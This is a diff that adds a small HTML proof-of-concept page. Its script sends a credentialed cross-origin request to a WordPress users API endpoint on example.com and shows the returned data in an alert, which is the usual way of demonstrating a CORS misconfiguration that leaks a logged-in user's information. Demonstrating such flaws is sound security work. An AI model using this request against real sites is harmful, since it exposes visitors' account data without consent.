@@ -1,0 +1,5 @@
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://example.com/wp-json/wp/v2/users/1',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
